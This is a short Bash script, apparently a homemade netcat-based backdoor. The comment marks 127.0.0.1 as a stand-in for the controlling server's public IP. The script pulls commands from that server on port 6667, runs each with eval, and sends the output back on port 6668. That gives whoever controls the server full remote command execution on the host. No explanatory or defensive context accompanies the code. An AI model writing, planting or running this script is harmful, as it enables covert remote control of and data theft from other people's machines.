ip=127.0.0.1 # 服务器公网IP
log=$(pwd)/output.log
nc $ip 6667 | while IFS= read -r i
do
    cat <<< "$i"
    eval "$i" >"$log" 2>&1
    cat "$log"
    nc $ip 6668 < "$log"
done